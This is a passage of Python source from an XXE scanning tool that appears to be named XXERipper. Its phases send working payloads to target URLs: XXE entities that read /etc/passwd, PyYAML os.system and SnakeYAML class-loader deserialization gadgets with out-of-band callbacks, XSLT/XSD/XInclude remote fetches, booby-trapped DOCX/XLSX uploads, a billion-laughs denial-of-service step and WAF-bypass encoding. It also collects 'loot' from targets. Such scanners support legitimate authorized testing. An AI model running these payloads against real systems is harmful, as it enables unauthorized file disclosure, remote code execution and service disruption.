        last_err = None

        for attempt in range(3):
            start = time.time()
            try:
                resp = self.session.request(
                    method, url, headers=headers, content=b"",
                    timeout=_as_httpx_timeout(self.timeout),
                    follow_redirects=False,
                )
                elapsed = time.time() - start
                if resp is not None and self.cookies.merge_set_cookie:
                    self.cookies.merge_response_cookies(resp)
                if resp.status_code in (429, 503):
                    ra = resp.headers.get("Retry-After")
                    if ra and str(ra).isdigit():
                        time.sleep(min(int(ra), 10))
                return resp, elapsed
            except (httpx.ConnectError,
                    httpx.RemoteProtocolError,
                    httpx.ReadError,
                    httpx.WriteError,
                    httpx.TimeoutException) as e:
                last_err = e
                time.sleep((1.5 ** attempt) * 0.5)
            except Exception as e:
                last_err = e
                return None, 0.0
        return None, 0.0
        
    def _phase_query_param(self):
        inner = ('<?xml version="1.0"?>'
                 '<!DOCTYPE root ['
                 '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
                 ']><root>&xxe;</root>')
        from urllib.parse import quote as _quote
        for param in ("xml", "data", "payload", "input"):
            if self.ctx.expired():
                return
            url = f"{self.url}{'&' if '?' in self.url else '?'}" \
                  f"{param}={_quote(inner)}"
            if len(url) > 4000:
                continue
            resp, elapsed = self._send_url(url)
            if resp is None:
                continue
            chain_ok = self._verify_entity_chain(inner, resp)
            self._score_and_report(
                f"XXE-QUERY-PARAM-{param}", "MEDIUM",
                f"XXE via query parameter '{param}'",
                f"Entity resolved from ?{param}= query parameter",
                "File disclosure via URL parameter",
                inner, resp, elapsed,
                chain_integrity=chain_ok,
                extra_evidence={"param": param, "url": url},
                file_target="/etc/passwd",
            )

    def _phase_multipart_and_docx(self):
        if not self.oob:
            return

        url_hint = any(k in self.url.lower() for k in
                       ("upload", "attach", "media", "file", "import",
                        "docx", "document", "office"))
        
        if not (self.svg_mode or url_hint):
            dbg(f"Skipping multipart/DOCX phase — no upload-shaped URL "
                f"segment and --svg not set")
            self.skipped_phases.append(
                ("multipart_docx", "no --svg and no upload-shaped URL"))
            return

        # Multipart XML field
        subdomain, token = self.oob.generate_correlated_subdomain("multipart")
        body, ct = XXEPayloadGenerator.multipart_xml(subdomain)
        if self._send_oob_and_check(
                "multipart-xml", subdomain,
                "Multipart XML form field with external parameter entity",
                body, content_type=ct):
            self.add_finding(
                "XXE-MULTIPART-XML", "CRITICAL",
                "Blind XXE via multipart XML field",
                "Multipart XML field triggered a correlated OOB callback",
                "Blind file disclosure via form upload",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain,
                    "token": token,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from multipart XML field"],
                confidence=50,
            )

        # DOCX upload
        subdomain2, token2 = self.oob.generate_correlated_subdomain("docx")
        docx_bytes = XXEPayloadGenerator.docx_xxe(subdomain2)
        if self._send_oob_and_check(
                "docx-upload", subdomain2,
                "DOCX word/document.xml with external parameter entity",
                docx_bytes,
                content_type=("application/vnd.openxmlformats-officedocument"
                              ".wordprocessingml.document")):
            self.add_finding(
                "XXE-DOCX-UPLOAD", "CRITICAL",
                "Blind XXE via DOCX upload",
                "DOCX word/document.xml resolved an external entity and "
                "triggered a correlated OOB callback",
                "Blind file disclosure via Office document upload",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain2,
                    "token": token2,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from DOCX upload"],
                confidence=50,
            )

    def _phase_office_xslt(self):
        if not self.oob:
            return

        url_hint = any(k in self.url.lower() for k in
                       ("upload", "document", "office", "convert",
                        "preview", "thumbnail", "render", "docx",
                        "xlsx", "word", "excel", "spreadsheet"))
        if not (self.svg_mode or url_hint):
            self.skipped_phases.append(
                ("office_xslt", "no upload-shaped URL segment"))
            return

        for label, factory, ct in (
            ("docx", XXEPayloadGenerator.docx_xslt_pi,
             "application/vnd.openxmlformats-officedocument"
             ".wordprocessingml.document"),
            ("xlsx", XXEPayloadGenerator.xlsx_xslt_pi,
             "application/vnd.openxmlformats-officedocument"
             ".spreadsheetml.sheet"),
        ):
            if self.ctx.expired():
                return

            subdomain, token = self.oob.generate_correlated_subdomain(
                f"office-xslt-{label}")
            stylesheet_url = f"http://{subdomain}/evil.xsl"
            body = factory(stylesheet_url)

            if self._send_oob_and_check(
                    f"office-xslt-{label}", subdomain,
                    f"{label.upper()} xml-stylesheet PI pointing at XSLT",
                    body, content_type=ct):
                self.add_finding(
                    f"XXE-OFFICE-XSLT-{label.upper()}", "CRITICAL",
                    f"XSLT processing in {label.upper()} upload pipeline",
                    f"The server-side document processor loaded the "
                    f"XSLT stylesheet referenced by the xml-stylesheet "
                    f"processing instruction in the {label.upper()} "
                    f"part. This is not XXE in the strict sense — it's "
                    f"XSLT invocation, which chains to file disclosure "
                    f"(document('file:///etc/passwd')) and SSRF.",
                    "File disclosure or SSRF via XSLT transform",
                    confirmed=True, exploitability="confirmed",
                    evidence={
                        "callback": subdomain,
                        "token": token,
                        "vector": label,
                        "stylesheet_url": stylesheet_url,
                        "score": 65,
                    },
                    reasons=[f"Correlated OOB callback from {label.upper()} "
                             f"XSLT stylesheet fetch"],
                    confidence=65,
                )

    def _phase_yaml_deser(self):
        if not self.oob:
            return

        subdomain, token = self.oob.generate_correlated_subdomain(
            "yaml-deser")

        pyyaml_payload = (
            f'!!python/object/apply:os.system\n'
            f'  - "nslookup {subdomain}"\n'
        )
        snakeyaml_payload = (
            f'!!javax.script.ScriptEngineManager\n'
            f'  - !!java.net.URLClassLoader\n'
            f'    - !!java.net.URL ["http://{subdomain}/"]\n'
        )

        probes = [
            ("pyyaml-raw", pyyaml_payload, "application/x-yaml"),
            ("snakeyaml-raw", snakeyaml_payload, "application/x-yaml"),
            ("pyyaml-xml",
             f'<?xml version="1.0"?>\n<request><yaml>{pyyaml_payload}</yaml></request>',
             "application/xml"),
            ("snakeyaml-xml",
             f'<?xml version="1.0"?>\n<request><yaml>{snakeyaml_payload}</yaml></request>',
             "application/xml"),
        ]

        for label, body, ct in probes:
            if self.ctx.expired():
                return

            if self._send_oob_and_check(
                    f"yaml-{label}", subdomain,
                    f"Unsafe YAML deserialization probe ({label})",
                    body, content_type=ct):
                self.add_finding(
                    f"XXE-YAML-DESER-{label.upper()}", "CRITICAL",
                    f"Unsafe YAML deserialization ({label})",
                    f"The target deserialized an attacker-controlled "
                    f"YAML document through the '{label}' delivery "
                    f"vector. Type tags in the payload caused a "
                    f"process execution (Python) or class-loader "
                    f"invocation (Java), proving full RCE reachable "
                    f"from this endpoint. This is CWE-502, related to "
                    f"but distinct from XXE.",
                    "Remote code execution via unsafe deserialization",
                    confirmed=True, exploitability="confirmed",
                    evidence={
                        "callback": subdomain,
                        "token": token,
                        "vector": label,
                        "content_type": ct,
                        "score": 85,
                    },
                    reasons=[f"Correlated OOB callback from {label} "
                             f"YAML payload"],
                    confidence=85,
                )
                return

    def _phase_xslt_and_schema(self):
        if not self.oob:
            return

        # XSLT document()
        subdomain, token = self.oob.generate_correlated_subdomain("xslt-doc")
        payload = XXEPayloadGenerator.xslt_document(
            f"http://{subdomain}/xslt"
        )
        if self._send_oob_and_check(
                "xslt-document", subdomain,
                "XSLT document() external fetch",
                payload, content_type="application/xslt+xml"):
            self.add_finding(
                "XXE-XSLT-DOCUMENT", "CRITICAL",
                "XSLT document() fetched external URL",
                "XSLT document() triggered a correlated OOB callback",
                "Blind XXE / SSRF via XSLT processor",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain,
                    "token": token,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from XSLT document()"],
                confidence=50,
            )

        # XSLT xsl:include
        subdomain2, token2 = self.oob.generate_correlated_subdomain("xslt-inc")
        payload2 = XXEPayloadGenerator.xslt_include(
            f"http://{subdomain2}/xslt-include"
        )
        if self._send_oob_and_check(
                "xslt-include", subdomain2,
                "XSLT xsl:include remote stylesheet fetch",
                payload2, content_type="application/xslt+xml"):
            self.add_finding(
                "XXE-XSLT-INCLUDE", "CRITICAL",
                "XSLT xsl:include fetched external URL",
                "xsl:include pulled a remote stylesheet and triggered "
                "a correlated OOB callback",
                "Blind XXE / SSRF via XSLT include",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain2,
                    "token": token2,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from xsl:include"],
                confidence=50,
            )

        # XSD schemaLocation
        subdomain3, token3 = self.oob.generate_correlated_subdomain("xsd-loc")
        payload3 = XXEPayloadGenerator.xsd_schema_location(
            f"http://{subdomain3}/schema.xsd"
        )
        if self._send_oob_and_check(
                "xsd-schemalocation", subdomain3,
                "xsi:schemaLocation external schema fetch",
                payload3):
            self.add_finding(
                "XXE-XSD-SCHEMALOCATION", "HIGH",
                "xsi:schemaLocation fetched external schema",
                "Validating parser fetched the schema named in "
                "xsi:schemaLocation",
                "Blind SSRF via XML schema resolution",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain3,
                    "token": token3,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from schemaLocation"],
                confidence=50,
            )

        # XSD xsd:import
        subdomain4, token4 = self.oob.generate_correlated_subdomain("xsd-imp")
        payload4 = XXEPayloadGenerator.xsd_import(
            f"http://{subdomain4}/imported.xsd"
        )
        if self._send_oob_and_check(
                "xsd-import", subdomain4,
                "xsd:import external schema fetch",
                payload4):
            self.add_finding(
                "XXE-XSD-IMPORT", "HIGH",
                "xsd:import fetched external schema",
                "Schema validation pulled an external XSD",
                "Blind SSRF via schema import",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain4,
                    "token": token4,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from xsd:import"],
                confidence=50,
            )

    def _phase_xml_stylesheet(self):
        if not self.oob:
            return

        subdomain, token = self.oob.generate_correlated_subdomain(
            "xml-stylesheet"
        )
        payload = XXEPayloadGenerator.xml_stylesheet_pi(
            f"http://{subdomain}/style.xsl"
        )
        if self._send_oob_and_check(
                "xml-stylesheet", subdomain,
                "xml-stylesheet PI external XSL fetch",
                payload):
            self.add_finding(
                "XXE-XML-STYLESHEET", "HIGH",
                "xml-stylesheet PI fetched external XSL",
                "Parser honoured the xml-stylesheet processing "
                "instruction and fetched the referenced stylesheet",
                "Blind SSRF via processing instruction",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain,
                    "token": token,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from xml-stylesheet PI"],
                confidence=50,
            )

    def _phase_xinclude_variants(self):
        if not self.oob:
            return

        subdomain, token = self.oob.generate_correlated_subdomain("xinclude-xml")
        payload = XXEPayloadGenerator.xinclude_xml(
            f"http://{subdomain}/inc.xml"
        )
        if self._send_oob_and_check(
                "xinclude-xml", subdomain,
                "XInclude parse='xml' external document fetch",
                payload):
            self.add_finding(
                "XXE-XINCLUDE-XML", "HIGH",
                "XInclude (parse='xml') fetched external document",
                "XInclude with parse='xml' triggered an outbound fetch",
                "Blind SSRF / file inclusion via XInclude",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain,
                    "token": token,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from XInclude parse='xml'"],
                confidence=50,
            )

    def _phase_dos_billion_laughs(self):
        if self.ctx.expired():
            return
        payload = XXEPayloadGenerator.billion_laughs()
        resp, elapsed = self._send(payload)
        if resp is None:
            return
        if not self.baseline.is_timing_anomaly_confirmed(elapsed):
            return
        self.add_finding(
            "XXE-DOS-BILLION-LAUGHS", "HIGH",
            "Potential DoS via entity expansion",
            f"Response delayed to {elapsed:.1f}s",
            "Denial of service via entity expansion",
            confirmed=False, exploitability="potential",
            evidence={
                "response_elapsed": round(elapsed, 2),
                "baseline_elapsed": round(self.baseline.median_elapsed, 2),
                "score": 20,
            },
            reasons=["Confirmed timing anomaly vs baseline"],
            confidence=20,
        )

    def scan(self) -> List[Finding]:
        dbg(f"Starting XXE scan on {self.url}")

        headers = self._build_headers()
        self.baseline = StatisticalBaseline()
        ok = self.baseline.capture(
            self.session, self.url, headers, self.timeout, BASELINE_SAMPLES
        )
        if not ok:
            dbg("Baseline capture failed")
            return self.findings

        if self.ctx.expired():
            return self.findings

        # ---- Fingerprint ------------------------------------------------
        if self.no_fingerprint:
            dbg("Skipping fingerprint phase (--no-fingerprint); "
                "capability gating is disabled")
            self.skipped_phases.append(
                ("fingerprint", "--no-fingerprint set"))
        else:
            self._run_phase("fingerprint", self._phase_fingerprint)
            if self.fingerprint and self.fingerprint.parser != "unknown":
                families = self.fingerprint.best_payload_family()
                dbg(f"Payload families to prioritize: {families}")

        # ---- Core phases ------------------------------------------------
        self._run_phase("inband",       self._phase_inband_file_read)
        self._run_phase("json_to_xml",  self._phase_json_to_xml)
        self._run_phase("content_type", self._phase_content_type_matrix)
        self._run_phase("method",       self._phase_method_variation)
        self._run_phase("query_param",  self._phase_query_param)
        self._run_phase("ssrf",         self._phase_ssrf)
        self._run_phase("cloud_metadata", self._phase_cloud_metadata)
        self._run_phase("rce_wrappers", self._phase_rce_wrappers)
        self._run_phase("error_based",  self._phase_error_based)

        # ---- OOB-dependent phases ---------------------------------------
        _OOB_PHASES = ("oob", "cdata", "xinclude_variants", "xslt_schema",
                       "xml_stylesheet", "multipart_docx", "form_encoded")
        if self.oob:
            self._run_phase("oob",              self._phase_oob)
            self._run_phase("cdata",            self._phase_cdata)
            self._run_phase("xinclude_variants", self._phase_xinclude_variants)
            self._run_phase("xslt_schema",      self._phase_xslt_and_schema)
            self._run_phase("xml_stylesheet",   self._phase_xml_stylesheet)
            self._run_phase("multipart_docx",   self._phase_multipart_and_docx)
            self._run_phase("form_encoded",     self._phase_form_encoded)
        else:
            for _name in _OOB_PHASES:
                self.skipped_phases.append((_name, "no --oob-domain"))

        # ---- Bypass / alternative sinks ---------------------------------
        self._run_phase("encoding",    self._phase_encoding_bypass)
        self._run_phase("xinclude",    self._phase_xinclude)
        self._run_phase("svg",         self._phase_svg_upload)
        self._run_phase("saml_soap",   self._phase_saml_soap)
        self._run_phase("saml_presig", self._phase_saml_presig)

        # ---- Opt-in phases ----------------------------------------------
        if self.timing_mode:
            self._run_phase("timing", self._phase_timing_blind)
        else:
            self.skipped_phases.append(("timing", "no --timing"))

        if self.unsafe:
            self._run_phase("dos", self._phase_dos_billion_laughs)
        else:
            self.skipped_phases.append(("dos", "no --unsafe"))

        # ---- Office XSLT + YAML deserialization -------------------------
        self._run_phase("office_xslt", self._phase_office_xslt)
        self._run_phase("yaml_deser",  self._phase_yaml_deser)

        # ---- User-supplied payloads -------------------------------------
        self._run_phase("custom", self._phase_custom)

        # ---- WAF bypass -------------------------------------------------
        if self.bypass_waf_encoders:
            self._run_phase("waf_bypass", self._phase_waf_bypass)
        else:
            self.skipped_phases.append(("waf_bypass", "no --bypass-waf"))

        # ---- Chain rollup ------------------------------------------------
        try:
            self.chain.emit_rollup_findings(self)
        except Exception as e:
            warn(f"chain rollup failed: {type(e).__name__}: {e}")

        return self.findings


def sev_order_high(a: str, b: str) -> bool:
    order = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
    try:
        return order.index(a) > order.index(b)
    except ValueError:
        return False


# ---------------------------------------------------------------------------
# Burp request parser
# ---------------------------------------------------------------------------

_TLS_PORTS = frozenset({443, 4443, 6443, 7443, 8443, 9443, 10443})
_HTTP_PORTS = frozenset({80, 8000, 8008, 8080, 8088, 8888})


def _extract_port(host: str) -> Optional[int]:
    if not host:
        return None

    if host.startswith("["):
        close = host.find("]")
        if close == -1:
            return None
        rest = host[close + 1:]
        if not rest.startswith(":"):
            return None
        try:
            return int(rest[1:])
        except ValueError:
            return None

    if host.count(":") == 1:
        try:
            return int(host.rsplit(":", 1)[1])
        except ValueError:
            return None

    return None


def _scheme_hint_from_headers(headers: Dict[str, str]) -> Optional[str]:
    for k, v in headers.items():
        if not v:
            continue
        lk = k.lower()
        if lk == "x-forwarded-proto":
            first = v.split(",", 1)[0].strip().lower()
            if first in ("http", "https"):
                return first
        elif lk == "forwarded":
            m = re.search(r'proto\s*=\s*"?([a-z]+)"?', v, re.IGNORECASE)
            if m and m.group(1).lower() in ("http", "https"):
                return m.group(1).lower()
        elif lk == ":scheme":
            if v.lower() in ("http", "https"):
                return v.lower()
    return None


def _scheme_for(host: str,
                http_version: str,
                headers: Optional[Dict[str, str]] = None) -> str:
    if headers:
        hint = _scheme_hint_from_headers(headers)
        if hint:
            return hint

    port = _extract_port(host)
    if port is not None:
        if port in _TLS_PORTS:
            return "https"
        if port in _HTTP_PORTS:
            return "http"
        return "https"

    if http_version.upper() in ("HTTP/2", "HTTP/2.0"):
        return "https"

    return "https"


def parse_burp_request_from_bytes(raw: bytes) -> Dict:
    header_blob, sep, body_blob = raw.partition(b"\r\n\r\n")
    if not sep:
        header_blob, sep, body_blob = raw.partition(b"\n\n")

    lines = header_blob.decode("utf-8", "replace").splitlines()
    if not lines:
        raise ValueError("empty request")

    parts = lines[0].strip().split()
    if len(parts) < 2:
        raise ValueError(f"malformed request line: {lines[0]!r}")

    method = parts[0].upper()
    target = parts[1]
    http_version = parts[2] if len(parts) > 2 else "HTTP/1.1"

    headers: Dict[str, str] = {}
    host: Optional[str] = None
    for line in lines[1:]:
        if not line.strip():
            break
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip(), v.strip()
        headers[k] = v
        if k.lower() == "host":
            host = v

    body = body_blob.decode("utf-8", "replace") if sep else None

    if target.startswith(("http://", "https://")):
        url = target
    else:
        if not host:
            raise ValueError("no Host header and no absolute URI in request line")
        scheme = _scheme_for(host, http_version, headers)
        path = target if target.startswith("/") else "/" + target
        url = f"{scheme}://{host}{path}"

    return {"method": method, "url": url, "headers": headers, "body": body}


def parse_burp_request(file_path: str) -> Dict:
    return parse_burp_request_from_bytes(Path(file_path).read_bytes())


# ---------------------------------------------------------------------------
# Session builder
# ---------------------------------------------------------------------------

def build_session(proxy: Optional[str] = None,
                  verify_tls: bool = False,
                  http2: bool = True,
                  timeout: Tuple[float, float] = DEFAULT_TIMEOUT,
                  ) -> httpx.Client:
    kwargs: Dict[str, Any] = {
        "verify": verify_tls,
        "timeout": _as_httpx_timeout(timeout),
        "follow_redirects": False,
        "http2": http2,
        "limits": httpx.Limits(
            max_connections=20,
            max_keepalive_connections=20,
        ),
        "headers": {},
    }
    if proxy:
        kwargs["proxies"] = proxy
    return httpx.Client(**kwargs)


def normalize_urls(url: str) -> List[str]:
    if url.startswith(("http://", "https://")):
        return [url]
    if re.match(r"^(localhost|\d+\.\d+\.\d+\.\d+)(:\d+)?$", url):
        return [f"http://{url}", f"https://{url}"]
    return [f"https://{url}", f"http://{url}"]


def load_urls(file_path: str) -> List[str]:
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]


# ---------------------------------------------------------------------------
# Scan worker
# ---------------------------------------------------------------------------

def scan_target(url: str,
                oob_domain: Optional[str],
                base_request: Optional[Dict],
                custom_payloads: CustomPayloadLoader,
                cookie_inline: Optional[str],
                cookie_file: Optional[str],
                merge_cookies: bool,
                unsafe: bool,
                proxy: Optional[str],
                poll_timeout: float,
                timing_mode: bool,
                rate: float,
                ctx: ScanContext,
                timeout: Tuple[float, float],
                verify_tls: bool,
                svg_mode: bool,
                no_fingerprint: bool = False,
                no_fingerprint_cache: bool = False,
                full_file_scan: bool = False,
                saml_mode: bool = False,
                bypass_waf_encoders: Optional[List[str]] = None,
                bypass_waf_include_custom: bool = False,
                cookie_content: Optional[str] = None,
                pre_auth_requests: Optional[List[Dict]] = None,
                oob_manager: Optional[InteractshManager] = None,
                event_cb: Optional[Any] = None,
                dtd_provider: Optional[Any] = None) -> Optional[Dict]:
                
    def _emit(kind, data=None):
        if event_cb is not None:
            try:
                event_cb(kind, data or {})
            except Exception:
                pass

    _emit("target_start", {"url": url})

    if rate and float(rate) > 0:
        rate_limiter: Optional[RateLimiter] = RateLimiter(
            min_interval=1.0 / float(rate)
        )
    else:
        rate_limiter = None

    session = build_session(proxy, verify_tls=verify_tls,
                            http2=True, timeout=timeout)

    cookies = CookieManager(
        inline=cookie_inline,
        cookie_file=cookie_file,
        cookie_content=cookie_content,
        burp_headers=base_request.get("headers") if base_request else None,
        merge_set_cookie=merge_cookies,
    )

    if pre_auth_requests:
        for idx, pa in enumerate(pre_auth_requests):
            try:
                pa_headers = dict(pa.get("headers", {}) or {})
                cv = cookies.header_value()
                if cv:
                    pa_headers["Cookie"] = cv
                pa_method = (pa.get("method") or "GET").upper()
                pa_url = pa["url"]
                pa_body = pa.get("body")
                pa_bytes = (
                    pa_body.encode("utf-8")
                    if isinstance(pa_body, str) and pa_body
                    else None
                )
                resp = session.request(
                    pa_method, pa_url, headers=pa_headers,
                    content=pa_bytes,
                    timeout=_as_httpx_timeout(timeout),
                    follow_redirects=True,
                )
                cookies.merge_response_cookies(resp)
                _emit("log", {
                    "level": "debug",
                    "msg": f"pre-auth #{idx + 1}: {pa_method} {pa_url} "
                           f"-> {resp.status_code} "
                           f"({len(cookies.as_dict())} cookie(s) in jar)",
                })
                if resp.status_code >= 400:
                    _emit("log", {
                        "level": "warn",
                        "msg": f"pre-auth #{idx + 1} returned "
                               f"{resp.status_code}; the scan may run "
                               f"unauthenticated",
                    })
            except Exception as e:
                _emit("log", {
                    "level": "warn",
                    "msg": f"pre-auth #{idx + 1} failed: {e!r}",
                })

    oob = None
    if oob_manager is not None:
        oob = OOBClient(manager=oob_manager)
        _emit("log", {
            "level": "debug",
            "msg": f"OOB auto mode: session domain {oob_manager.domain}",
        })
    elif oob_domain:
        normalized = _normalize_oob_domain(oob_domain)
        if not normalized:
            warn(f"OOB domain {oob_domain!r} does not look like a "
                 f"hostname (expected something like <session>.oast.pro); "
                 f"OOB phases will be skipped")
        else:
            oob = OOBClient(domain=normalized)

    detector = XXEDetector(
        url=url, session=session, cookies=cookies, oob=oob,
        base_request=base_request, custom_payloads=custom_payloads,
        unsafe=unsafe, proxy=proxy, timing_mode=timing_mode,
        rate_limiter=rate_limiter, ctx=ctx,
        timeout=timeout, verify_tls=verify_tls, svg_mode=svg_mode,
        saml_mode=saml_mode,
        bypass_waf_encoders=bypass_waf_encoders,
        bypass_waf_include_custom=bypass_waf_include_custom,
        no_fingerprint=no_fingerprint, full_file_scan=full_file_scan,
        no_fingerprint_cache=no_fingerprint_cache,
        oob_poll_timeout=poll_timeout,
        event_cb=event_cb,
        dtd_provider=dtd_provider,
    )

    findings = detector.scan()
    oob_stats = oob.stats() if oob else {"payloads_sent": 0,
                                          "subdomains": [],
                                          "observations": []}

    skipped = list(getattr(detector, "skipped_phases", []))

    if findings or oob_stats["payloads_sent"] > 0 or skipped \
            or detector.loot.all():
        _emit("target_end",
              {"url": url, "had_findings": bool(findings)})
        return {
            "url": url,
            "cookies_used": cookies.has_cookies(),
            "parser_fingerprint": (
                detector.fingerprint.parser if detector.fingerprint else "unknown"
            ),
            "findings": [f.to_dict() for f in findings],
            "loot": detector.loot.all(),
            "loot_counts": detector.loot.counts(),
            "oob_payloads_sent": oob_stats["payloads_sent"],
            "oob_subdomains": oob_stats["subdomains"],
            "oob_observations": oob_stats["observations"],
            "skipped_phases": skipped,
        }
    _emit("target_end",
          {"url": url, "had_findings": False})
    return None

# ---------------------------------------------------------------------------
# SARIF output
# ---------------------------------------------------------------------------

SARIF_LEVEL = {
    "CRITICAL": "error",
    "HIGH":     "error",
    "MEDIUM":   "warning",
    "LOW":      "note",
    "INFO":     "note",
}


def build_sarif(results: List[Dict], tool_version: str = "1.0.0") -> Dict:
    rules_by_id: Dict[str, Dict] = {}
    for r in results:
        for f in r.get("findings", []):
            fid = f["id"]
            if fid in rules_by_id:
                continue
            cwes = f.get("cwe", [])
            if cwes:
                cwe_num = cwes[0].split("-", 1)[1]
                help_uri = f"https://cwe.mitre.org/data/definitions/{cwe_num}.html"
            else:
                help_uri = "https://github.com/kamalx06/XXERipper"
            cwe_names = f.get("cwe_descriptions") or \
            [CWE_DESCRIPTIONS.get(c, c) for c in cwes]
            rules_by_id[fid] = {
                "id": fid,
                "name": fid,
                "shortDescription": {"text": f.get("title", fid)},
                "fullDescription":  {"text": f.get("description", "")},
                "helpUri": help_uri,
                "help": {
                    "text": "; ".join(cwe_names) if cwe_names else "",
                },
                "properties": {
                    "cwe": cwes,
                    "cwe_descriptions": cwe_names,
                    "tags": ["security", "xxe"],
                },
            }

    sarif_results: List[Dict] = []
    for r in results:
        target_url = r.get("url", "")
        for f in r.get("findings", []):
            sarif_results.append({
                "ruleId":  f["id"],
                "level":   SARIF_LEVEL.get(f.get("severity", "MEDIUM"),
                                           "warning"),
                "message": {"text": f"{f.get('title', '')} — "
                                    f"{f.get('description', '')}"},
                "locations": [{
                    "physicalLocation": {
                        "artifactLocation": {"uri": target_url}
                    }
                }],
                "properties": {
                    "severity":       f.get("severity", ""),
                    "confidence":     f.get("confidence", 0),
                    "exploitability": f.get("exploitability", ""),
                    "confirmed":      f.get("confirmed", False),
                    "cwe":            f.get("cwe", []),
                    "reasons":        f.get("reasons", []),
                    "evidence":       f.get("evidence", {}),
                },
            })

    return {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name":           "XXERipper",
                    "version":        tool_version,
                    "informationUri": "https://github.com/kamalx06/XXERipper",
                    "rules":          list(rules_by_id.values()),
                }
            },
            "results": sarif_results,
        }],
    }

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _print_oob(result: Dict, indent: str = "  "):
    obs = result.get("oob_observations") or []
    if not obs:
        return
    n = len(obs)
    print(f"{indent}[OOB] {n} payload(s) dispatched — "
          f"watch your interactsh-client terminal")
    for o in obs:
        tech = o.get("technique", "?")
        sub = o.get("subdomain", "?")
        note = o.get("note", "")
        corr = o.get("correlated")
        if corr is True:
            mark = "✓"
        elif corr is False:
            mark = " "
        else:
            mark = "?"
        print(f"{indent}    [{mark}] [{tech}] {sub}")
        if note:
            print(f"{indent}        {note}")

def _print_skips(skipped: List[Tuple[str, str]], indent: str = "  "):
    if not skipped:
        return
    from collections import defaultdict
    grouped: Dict[str, List[str]] = defaultdict(list)
    for name, reason in skipped:
        grouped[reason].append(name)
    total = len(skipped)
    print(f"{indent}[!] {total} phase(s) skipped:")
    for reason, names in grouped.items():
        joined = ", ".join(names)
        print(f"{indent}      - {joined}  ({reason})")


class ScanJob:

    def __init__(self, job_id: str, config: Dict[str, Any]):
        self.id = job_id
        self.config = config
        self.status = "queued"
        self.started_at: Optional[float] = None
        self.finished_at: Optional[float] = None
        self.error: Optional[str] = None
        self.result: Optional[Dict] = None
        self._events: List[Dict] = []
        self._findings: List[Dict] = []
        self._oob_dispatches: List[Dict] = []
        self._loot: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()
        self.ctx: Optional[ScanContext] = None
        self._cancelled = threading.Event()

    def cancel(self):
        self._cancelled.set()
        if self.ctx is not None:
            self.ctx.cancel()

    def is_cancelled(self) -> bool:
        return self._cancelled.is_set()

    def emit(self, kind: str, data: Dict[str, Any]):
        with self._lock:
            self._events.append({"ts": time.time(),
                                 "kind": kind, "data": data})
            if kind == "finding":
                self._findings.append(data.get("finding", {}))
            elif kind == "finding_updated":
                f = data.get("finding", {})
                for i, existing in enumerate(self._findings):
                    if existing.get("id") == f.get("id"):
                        self._findings[i] = f
                        break
                else:
                    self._findings.append(f)
            elif kind == "loot":
                e = data.get("entry") or {}
                if e.get("id"):
                    self._loot[e["id"]] = e
            elif kind == "oob_dispatch":
                self._oob_dispatches.append(data)
            elif kind == "oob_result":
                sub = data.get("subdomain")
                for d in self._oob_dispatches:
                    if d.get("subdomain") == sub:
                        d["correlated"] = data.get("correlated")
                        break

    def counts(self) -> Tuple[int, int]:
        with self._lock:
            n = len(self._findings)
            c = sum(1 for f in self._findings
                    if f.get("severity") == "CRITICAL")
        return n, c

    def snapshot(self, since: int = 0) -> Dict[str, Any]:
        with self._lock:
            return {
                "id": self.id,
                "status": self.status,
                "config": self.config,
                "started_at": self.started_at,
                "finished_at": self.finished_at,
                "error": self.error,
                "events": self._events[since:],
                "next_cursor": len(self._events),
                "findings": list(self._findings),
                "oob_dispatches": list(self._oob_dispatches),
                "loot": list(self._loot.values()),
                "result": self.result
                if self.status in ("done", "error", "cancelled") else None,
            }


_JOBS: Dict[str, ScanJob] = {}
_JOBS_LOCK = threading.Lock()
_WEBUI_OOB_MANAGER: Optional[InteractshManager] = None
_WEBUI_OOB_LOCK = threading.Lock()
_WEBUI_DTDS: Dict[str, str] = {}
_WEBUI_DTDS_LOCK = threading.Lock()


class WebUIDTDServer:

    def __init__(self, public_url: str):
        self.public_url = public_url.rstrip("/")

    def register(self, token: str, dtd_content: str) -> str:
        with _WEBUI_DTDS_LOCK:
            _WEBUI_DTDS[token] = dtd_content
        return f"{self.public_url}/dtd/{token}.dtd"

    def stop(self) -> None:
        return

    @property
    def enabled(self) -> bool:
        return True

def _get_or_create_webui_oob_manager() -> InteractshManager:
    global _WEBUI_OOB_MANAGER
    with _WEBUI_OOB_LOCK:
        if _WEBUI_OOB_MANAGER is not None:
            return _WEBUI_OOB_MANAGER
        mgr = InteractshManager()
        mgr.start()
        _WEBUI_OOB_MANAGER = mgr
        return mgr


def _shutdown_webui_oob_manager():
    global _WEBUI_OOB_MANAGER
    with _WEBUI_OOB_LOCK:
        if _WEBUI_OOB_MANAGER is not None:
            try:
                _WEBUI_OOB_MANAGER.stop()
            except Exception:
                pass
            _WEBUI_OOB_MANAGER = None

def _resolve_oob_timeout(cfg: Dict[str, Any], job: "ScanJob") -> float:
    auto = bool(cfg.get("oob_auto"))
    domain = (cfg.get("oob_domain") or "").strip()
    raw = cfg.get("oob_timeout")

    if domain and not auto:
        if raw is not None:
            job.emit("log", {
                "level": "warn",
